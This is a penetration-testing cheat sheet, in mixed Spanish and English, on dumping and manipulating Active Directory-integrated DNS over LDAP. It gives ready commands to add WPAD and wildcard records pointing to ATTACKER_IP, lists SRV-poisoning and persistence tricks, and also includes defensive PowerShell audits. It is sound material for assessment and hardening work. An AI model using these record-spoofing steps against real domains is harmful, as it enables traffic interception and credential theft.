---
aliases:
  - adidnsdump
  - DNS via LDAP
  - AD DNS Dump
  - dnsRecord blob
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - DNS & SRV Records]]"
---
# AD - DNS & SRV Records - Adidnsdump y DNS Authenticated

***

## Why DNS via LDAP

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| AD-integrated zones stored in AD | Replication via AD | Architecture. |
| LDAP path `DC=DomainDnsZones,DC=...` | Direct LDAP access | Standard. |
| `dnsRecord` attribute | Binary blob with parsed record | Encoded. |
| LDAP read != DNS query | Different protocols | Distinct. |
| ANY records hidden by default DNS | LDAP shows all even hidden | Bypass. |
| Authentication required | Domain creds typically | Limit. |
| Default Authenticated Users read | Most zones readable | Permissive. |
| AXFR may be disabled but LDAP open | Common gap | Vector. |
| dnsRecord blob format | Binary needs decode | Tool needed. |
| adidnsdump parses blobs | Python tool | Standard. |
| RustHound / BloodHound DNS-aware | Modern collection | Adjacent. |
| Per-record ACLs | DACL on dnsNode | Granular. |
| Wildcard records via LDAP | Sometimes hidden in DNS but visible LDAP | Bypass. |
| Tombstoned records still visible | Pre-purge garbage collection | Audit. |
| Zone-level DACL audit | Privesc path discovery | ACL recon. |
| SOA stored as dnsRecord too | Edge metadata | Detail. |
^ad-adidns-why

### LDAP DNS path examples

```
# Domain DNS partition
DC=DomainDnsZones,DC=dom,DC=local
  └── DC=dom.local
        ├── DC=dc01            (A record)
        ├── DC=dc02            (A record)
        ├── DC=@               (zone apex)
        └── DC=_msdcs.dom.local (subdomain)

# Forest DNS partition
DC=ForestDnsZones,DC=forest,DC=local
  └── DC=_msdcs.forest.local

# Legacy
CN=MicrosoftDNS,CN=System,DC=dom,DC=local
```

___

## adidnsdump Tool

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| `adidnsdump -u 'dom\user' -p pass DC` | Zone list | Discovery. |
| `adidnsdump -u 'dom\user' -p pass DC --print-zones` | Print zones to stdout | Quick view. |
| `adidnsdump -u 'dom\user' -p pass DC -r` | Resolve via DNS for verification | Validates. |
| `adidnsdump -u 'dom\user' -p pass DC -z dom.local` | Specific zone | Targeted. |
| `adidnsdump -u 'dom\user' -p pass DC --print-zones --verbose` | Verbose | Debug. |
| `adidnsdump -u 'dom\user' -p pass DC --include-hidden` | Show "hidden" records | Default lists ANY records. |
| Output file `records.csv` | CSV format | Default. |
| Auth via TGT/Kerberos | `-k` Kerberos auth | Modern. |
| LDAPS support | Auto-detect | Encrypted. |
| Cert auth (PFX) | Modern auth | Edge. |
| Anonymous attempt | Some zones allow | Edge. |
| Forest zones via `-z` | Forest scope | Adjacent. |
| Decoded blob → record fields | Type, value, timestamp | Standard. |
| Generates LDIF too | Restoration format | Edge. |
| Compatible with bloodyAD | Same auth model | Adjacent. |
| Python install | `pip install adidnsdump` | Standard. |
^ad-adidns-tool

### Standard usage

```bash
# Install
pip install git+https://github.com/dirkjanm/adidnsdump

# Basic enumeration (all zones)
adidnsdump -u 'dom\user' --password 'pass' DC

# Specific zone with DNS resolution
adidnsdump -u 'dom\user' --password 'pass' DC -r --zone dom.local

# Output: records.csv
# Format: name,type,address
# Example:
#   @,SOA,...
#   dc01,A,10.0.0.10
#   webserver,A,10.0.0.50
#   wpad,A,10.0.0.100
#   *,A,10.0.0.200
```

___

## ANY Records / Default Visibility

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| ANY records | Default DACL | All Authenticated Users can create. |
| Default Permission: Create child | Authenticated Users can add records | Risk. |
| `Resolve-DnsName ANY` | Get all records of a name | Native. |
| ANY hidden by default DNS query | Server doesn't return | Hidden visibility. |
| LDAP query reveals ANY | Direct LDAP shows hidden | Bypass. |
| DNS spoofing prerequisite | ANY record write capability | Common attack base. |
| WPAD attack base | Create wpad A record | Combo. |
| LLMNR fallback when WPAD missing | If WPAD spoof + name not in DNS | Combo. |
| Created by atacante via LDAP | LDAP write permission needed | Direct. |
| DDNS update vs LDAP write | Different paths same outcome | Adjacent. |
| Pre-existing record blocks creation | Conflicts | Edge. |
| Wildcard `*` record | Catch-all | Critical for spoofing. |
| `wpad`, `isatap` blocked in some Win versions | Modern protection | Defense. |
| Audit Authenticated Users CreateChild | Default behavior | Permission audit. |
| Restrict creation to specific groups | Hardening | Defense. |
| Modern Microsoft DNS (Server 2016+) | Restricted creation | Better default. |
^ad-adidns-any

### ANY record discovery + creation

```bash
# List all records visible via LDAP (incl. ANY)
adidnsdump -u 'dom\user' --password 'pass' DC --include-hidden -z dom.local

# Compare with DNS:
# Records in LDAP but NOT in DNS = ANY records (server doesn't advertise)

# Create ANY record (krbrelayx dnstool combined)
git clone https://github.com/dirkjanm/krbrelayx
python3 dnstool.py -u 'dom\user' -p pass -a add -r evil -d 1.2.3.4 DC
```

___

## DNS Permissions Audit

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| `Get-Acl "AD:DC=DomainDnsZones,DC=dom,DC=local"` | Partition DACL | RSAT. |
| `Get-Acl "AD:DC=dom.local,DC=DomainDnsZones,..."` | Zone DACL | Per-zone. |
| `Get-Acl "AD:DC=hostname,DC=dom.local,..."` | Per-record DACL | Per-record. |
| `dsacls "DC=DomainDnsZones,DC=dom,DC=local"` | Native | Adjacent. |
| `bloodyAD --host DC -d dom -u u -p p get object DC=dom.local,DC=DomainDnsZones,DC=dom,DC=local --resolve-sd` | Detailed DACL | Linux. |
| GenericAll on dnsZone | Modify all records | Critical. |
| GenericWrite on dnsZone | Modify records | Common abuse. |
| WriteDACL on dnsZone | Escalate to Generic All | 2-step. |
| Create child on dnsZone | Add records (default Auth Users) | Spoof base. |
| WriteProperty on dnsRecord | Edit specific record | Granular. |
| Per-record DACL inheritance | Children inherit | Standard. |
| DNS Admins recursive perms | Propagated to all records | Standard. |
| Default for Authenticated Users | CreateChild on zone | Permissive. |
| Hardening: deny CreateChild | Modern best practice | Defense. |
| BloodHound DNS edge | `WriteDnsRecord` (custom edge) | Custom analytics. |
| Detection: SACL audit DNS partition | Defender alert | Adjacent. |
^ad-adidns-acl

### DNS DACL audit

```powershell
# Per-zone DACL
Get-Acl "AD:DC=dom.local,DC=DomainDnsZones,DC=dom,DC=local" |
  Select -ExpandProperty Access |
  Where {$_.AccessControlType -eq "Allow"} |
  Where {$_.IdentityReference -notmatch "BUILTIN|NT AUTHORITY|Domain Admins"} |
  Select IdentityReference,ActiveDirectoryRights

# All zones with non-default permissions
Get-ChildItem "AD:DC=DomainDnsZones,DC=dom,DC=local" |
  ForEach-Object {
    $dn = $_.DistinguishedName
    Get-Acl "AD:$dn" |
      Select -ExpandProperty Access |
      Where {$_.AccessControlType -eq "Allow" -and $_.IdentityReference -notmatch "BUILTIN|Domain Admins|Enterprise Admins|SYSTEM"} |
      Select @{n='Zone';e={$dn}},IdentityReference,ActiveDirectoryRights
  }
```

___

## Records Manipulation Tools

| **Tool** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| `dnstool.py` (krbrelayx) | `dnstool.py -u u -p p -a add -r host -d ip DC` | Add via LDAP. |
| `dnstool.py` query | `dnstool.py -u u -p p -a query -r host DC` | Query specific. |
| `dnstool.py` modify | `dnstool.py -u u -p p -a modify ...` | Modify. |
| `dnstool.py` remove | `dnstool.py -u u -p p -a remove ...` | Remove. |
| `dnstool.py` ldapdelete | `--remove-tombstone` purge | Edge. |
| `Set-DnsServerResourceRecord` | RSAT modify | Native. |
| `Add-DnsServerResourceRecord` | RSAT add | Native. |
| `Remove-DnsServerResourceRecord` | RSAT remove | Native. |
| `dnscmd /recordadd` | Native CLI | Adjacent. |
| `bloodyAD` LDAP modifier | Generic LDAP | Linux. |
| Direct LDAP modify | Custom scripts | DIY. |
| krbrelayx auto-add WPAD | Combo with relay | Attack chain. |
| mitm6 + dnstool | IPv6 takeover | Combo (ver hub mitm6). |
| `Set-DnsServerForwarder` | Forwarder manipulation | Edge. |
| Conditional forwarders | Cross-zone control | Edge. |
| `Restore-DnsServerSecondaryZone` | Edge | Adjacent. |
^ad-adidns-tools

### Add WPAD record (DNS spoof)

```bash
# Create wpad record pointing to attacker
python3 dnstool.py -u 'dom\user' -p pass -a add -r wpad -d ATTACKER_IP DC

# Verify creation
dig +short A wpad.dom.local @DC

# Cleanup after attack
python3 dnstool.py -u 'dom\user' -p pass -a remove -r wpad DC
```

___

## DNS-Based Persistence

| **Vector** | **Cómo** | **Notas** |
|:---:|:---:|:---:|
| Persistent A record to attacker | Create record, schedule purges | Standard persistence. |
| Wildcard record `*` | Catch-all for non-existent names | Critical. |
| WPAD record → attacker proxy | Browser auto-config redirected | Combo. |
| ISATAP record → IPv6 tunnel | Edge IPv6 routing | Edge. |
| `_kerberos._tcp` poison → fake KDC | Auth interception | Critical. |
| `_ldap._tcp` poison → fake LDAP | Auth interception | Critical. |
| Internal CDN → backdoored | Modify A record for app | Persistent. |
| Conditional forwarder → atacante DNS | Forward queries to attacker | Persistent. |
| Static record (no scavenge) | Won't auto-purge | Resilient. |
| TimeStamp 0 = static | LDAP attribute | Direct. |
| Hidden ANY record | Doesn't show in default DNS | Stealth. |
| Sub-zone delegation to atacante | Add NS record | Edge. |
| Hosts file backup | Local file as backup | Combo. |
| DDNS auto-recreate after purge | If insecure DDNS | Auto-restore. |
| GPO + DNS suffix | Add attacker domain to suffix list | Edge. |
| Defender: scavenge stale + audit additions | Standard hygiene | Defense. |
^ad-adidns-persistence

### Persistent record audit

```powershell
# Static records (TimeStamp = 0)
Get-DnsServerResourceRecord -ZoneName "dom.local" -ComputerName DC |
  Where {$_.Timestamp -eq 0} |
  Select RecordType,HostName,RecordData

# Recently added records (last 7 days)
Get-DnsServerResourceRecord -ZoneName "dom.local" -ComputerName DC |
  Where {$_.Timestamp -gt (Get-Date).AddDays(-7)} |
  Select RecordType,HostName,RecordData,Timestamp

# Wildcard or suspicious records
Get-DnsServerResourceRecord -ZoneName "dom.local" -ComputerName DC |
  Where {$_.HostName -in '*','wpad','isatap'} |
  Select RecordType,HostName,RecordData
```

***
